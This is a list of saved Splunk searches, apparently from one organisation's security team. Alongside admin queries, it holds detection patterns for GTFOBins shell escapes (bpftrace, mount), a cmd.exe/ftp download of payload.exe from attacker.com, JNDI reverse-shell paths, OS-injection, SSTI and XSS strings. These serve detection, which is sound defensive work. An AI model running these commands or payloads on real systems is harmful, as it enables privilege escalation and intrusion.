name: (Linux) ash
query: (index="linux_corp" OR index="linux_dmz") AND (comm="ash" OR comm="*/ash" OR comm="* ash" OR comm="* */ash" OR "ash -c")

name: (Linux) bpftrace
query: (index="linux_corp" OR index="linux_dmz") AND (sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'*echo 'BEGIN {system("/bin/sh");exit()}' >*sudo bpftrace *sudo bpftrace -c /bin/sh -e 'END {exit()}')

name: Bucket Merge Retrieve Conf Settings
query:
| rest services/data/indexes datatype=all 
| search disabled!=1 AND bucketMerging=1 
| dedup title 
| fields title bucketMerging bucketMerge.minMergeSizeMB bucketMerge.maxMergeSizeMB bucketMerge.maxMergeTimeSpanSecs bucketMerge.minMergeCount bucketMerge.maxMergeCount

name: (Linux) cpio
query: (index="linux_corp" OR index="linux_dmz") AND (comm="cpio *" OR comm="* cpio" OR comm="* cpio *" OR comm="*/cpio *" OR comm="* */cpio *")

name: (Linux) dmsetup
query: (index="linux_corp" OR index="linux_dmz") AND (sudo dmsetup create base --exec)

name: (Linux) env
query: (index="linux_corp" OR index="linux_dmz") AND (comm="env *" OR comm="* env *" OR comm="*/env *" OR comm="* */env *" OR *.env OR comm="* *.env" OR comm="* *.env *")

name: Errors in the last 24 hours
query: error OR failed OR severe OR ( sourcetype=access_* ( 404 OR 500 OR 503 ) )

name: Errors in the last hour
query: error OR failed OR severe OR ( sourcetype=access_* ( 404 OR 500 OR 503 ) )

name: finds all files on the system with the SUID
Latest Updates of All Risk Lists
query: | inputlookup checkpoints | eval Time=strftime(updated,"%a %b %d, %Y at %I:%M:%S:%p") | eval split_history=split(history,",") | eval time_history=strftime(split_history,"%a %b %d, %Y at %I:%M:%S:%p") | where isnotnull(time_history) | rename name TO "Risklist name" | rename Time TO "Last updated" | rename time_history TO "Last 5 updates" | fields "Risklist name", "Last updated", "Last 5 updates"

name: License Usage Data Cube
query: index=_internal source=*license_usage.log* type="Usage" | eval h=if(len(h)=0 OR isnull(h),"(SQUASHED)",h) | eval s=if(len(s)=0 OR isnull(s),"(SQUASHED)",s) | eval idx=if(len(idx)=0 OR isnull(idx),"(UNKNOWN)",idx) | bin _time span=1d | stats sum(b) as b by _time, pool, s, st, h, idx

name: LOLBAS  T1036.005: Match Legitimate Name or Location
LOLBAS  T1127: Trusted Developer Utilities Proxy Execution
LOLBAS  T1218: System Binary Proxy Execution
LOLBAS  T1218: System Binary Proxy Execution - 2
LOLBAS certutil
query: certutil.exe AND ("urlcache" OR "verifyctl" OR "urlcache" OR "encode" OR "decode" OR "decodehex")

name: LOLBAS T1105: Ingress Tool Transfer/T1218: System Binary Proxy Execution
LOLBAS T1127: Trusted Developer Utilities Proxy Execution
LOLBAS T1218: System Binary Proxy Execution
LOLBAS T1218: System Binary Proxy Execution/ T1105: Ingress Tool Transfer
LOLBAS T1567: Exfiltration Over Web Service
Messages by minute last 3 hours
query: index=_internal source="*metrics.log" eps "group=per_source_thruput" NOT filetracker | eval events=eps*kb/kbps | timechart fixedrange=t span=1m limit=5 sum(events) by series

name: (Linux) mount
query: (index="linux_corp" OR index="linux_dmz") AND (sudo mount -o bind /bin/sh /bin/mountsudo mount)

name: (Linux) opkg
query: (index="linux_corp" OR index="linux_dmz") AND (sudo opkg install deb)

name: Orphaned scheduled searches
query:
| rest timeout=600 splunk_server=local /servicesNS/-/-/saved/searches add_orphan_field=yes count=0 
| search orphan=1 disabled=0 is_scheduled=1 
| eval status = if(disabled = 0, "enabled", "disabled") 
| fields title eai:acl.owner eai:acl.app eai:acl.sharing orphan status is_scheduled cron_schedule next_scheduled_time next_scheduled_time actions 
| rename title AS "search name" eai:acl.owner AS owner eai:acl.app AS app eai:acl.sharing AS sharing

name: (Linux) python
query: (index="linux_corp" OR index="linux_dmz") AND (comm="python *" OR comm="python3 *" OR "import *os*" OR comm="pip3 *" OR "pip *" OR "import sys")

name: Recorded Future - Back-fill Correlation Search
query: | localop | rest splunk_server=local /services/TA-recordedfuture/correlation_search earliest=$dispatch.earliest_time$ latest=$dispatch.latest_time$ dm_only=true

name: Recorded Future - Purge Old Correlation Data
Recorded Future - Purge Old Sigma Rules Detections
Recorded Future - Purge Old Threat Hunt Results
Recorded Future - Send Weekly Active Users statistics
(Linux) redis
query: (index="linux_corp" OR index="linux_dmz") AND (redis-cli -h set dir save)

name: Searching for active hosts by ping and grep
(Linux) sftp
query: (index="linux_corp" OR index="linux_dmz") AND (sftp AND ("/bin/*" OR "get" OR "put"))

name: (Linux) sqlite3
query: (index="linux_corp" OR index="linux_dmz") AND (comm="sqlite3" OR comm="*/sqlite3" OR comm="sqlite3 *" OR comm="*/sqlite3 *" OR comm="* */sqlite3 *" OR comm="* sqlite3 *")

name: (Windows) T1105: Ftp.exe
query: (index="windows") AND (cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v")

name: (Linux) tcpdump
query: (index="linux_corp" OR index="linux_dmz") AND (echo > chmod +x tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z)

name: Top 10 Failed Logins
query:
source=prod OktaClass=PasswordBasedLoginController AND "LoginStatus: INVALID_CREDENTIALS" NOT "mycompany" NOT "primeapp" NOT "rumblies" NOT "rod-ops-mon@servicesource.com" NOT "stkwebalerts" | reltime | rex field=_raw "User: \[(?<username>.*)\] attempted login on domain \[(?<domain>.*)\] from \[(?<sip>.*)\] with result: \[User:(?<uid>.*) LoginStatus: (?<status>.*)\]. \["
| where domain=$Organization$
| convert ctime(_time) as timer
| stats count(status) as counter by sip
| sort counter
| top counter, sip

name: Validate App Deployment
query: | localop | rest splunk_server=local /services/TA-recordedfuture/validate | eval Step=substr(step, 6) | sort Step | rename result.Status TO Status | rename result.information TO Information | eval Name='result.Verification step' | eval Suggestion='result.Suggested action' | eval Information='result.Information'  | table Step, Name, Status, Information, Suggestion

name: WebAttack_Java_Payload
query: "%24%7B%28%23a%3D%40" OR "${(#a=@" OR "%24%7B%40java" OR "${@java" OR "u0022java" OR "%2F%24%7B%23" OR "/${#" OR "new+java." OR "getRuntime().exec(" OR "getRuntime%28%29.exec%28" OR "ls"

name: WebAttack_JNDI_Exploit
query: "/Basic/Command/Base64/" OR "/Basic/ReverseShell/" OR "/Basic/TomcatMemshell" OR "/Basic/JettyMemshell" OR "/Basic/WeblogicMemshell" OR "/Basic/JBossMemshell" OR "/Basic/WebsphereMemshell" OR "/Basic/SpringMemshell" OR "/Deserialization/URLDNS/" OR "/Deserialization/CommonsCollections1/Dnslog/" OR "/Deserialization/CommonsCollections2/Command/Base64/" OR "/Deserialization/CommonsBeanutils1/ReverseShell/" OR "/Deserialization/Jre8u20/TomcatMemshell" OR "/TomcatBypass/Dnslog/" OR "/TomcatBypass/Command/" OR "/TomcatBypass/ReverseShell/" OR "/TomcatBypass/TomcatMemshell" OR "/TomcatBypass/SpringMemshell" OR "/GroovyBypass/Command/" OR "/WebsphereBypass/Upload/"

name: WebAttack_OS_Injection
query: "*=whoami" OR "*=net%20user" OR "*=net+user" OR "*=cmd%20/c%" OR "*=cmd+/c+" OR "*=cmd%2B/c%" OR "*=cmd%20/r%" OR "*=cmd+/r+" OR "*=cmd%2B/r%" OR "*=cmd%20/k%" OR "*=cmd+/k+" OR "*=cmd%2B/k%" OR "*=powershell%*" OR "*=powershell+*" OR "*=tasklist%*" OR "*=tasklist+*" OR "*=wmic%*" OR "*=wmic+*" OR "*=ssh%*" OR "*=ssh+*" OR "*=python%*" OR "*=python+*" OR "*=python3%*" OR "*=python3+*" OR "*=ipconfig" OR "*=wget%*" OR "*=wget+*" OR "*=curl%*" OR "*=curl+*" OR "*=certutil*" OR "*=copy%20%5C%5C*" OR "*=dsquery%*" OR "*=dsquery+*" OR "*=nltest%*" OR "*=nltest+*"

name: WebAttack_SSTI
query: "={{" OR "=%7B%7B" OR "=${" OR "=$%7B" OR "=<%=" OR "=%3C%25=" OR "=@(" OR "freemarker.template.utility.Execute" OR "*.getClass().forName('javax.script.ScriptEngineManager" OR "T(org.apache.commons.io.IOUtils)"

name: WebAttack_XSS
query: "*=<script>*" OR "*=%3Cscript%3E*" OR "*=%253Cscript%253E*" OR "*<iframe *" OR "*%3Ciframe *" OR "*<svg *" OR "*%3Csvg *" OR "*document.cookie*" OR "*document.domain*" OR "* onerror=*" OR "* onresize=*" OR "* onload=*" OR "onmouseover=*" OR "${alert*" OR "javascript:alert*" OR "javascript%3Aalert*"

name: Windows BruteForce Successful
query:
index=* (EventCode=4624 OR EventCode=4625) 
| bin _time span=5m as minute 
| stats list(Keywords) as Attempts, count(eval(EventCode=4625)) as Failed,
     count(eval(EventCode=4624)) as Success, list(Failure_Reason) as "Failure Reason", list(host) as "Machine Identifier" by minute Account_Name 
| where mvcount(Attempts)>=10 AND Success>=1 AND Failed>=9 
| eval minute=strftime(minute,"%H:%M")
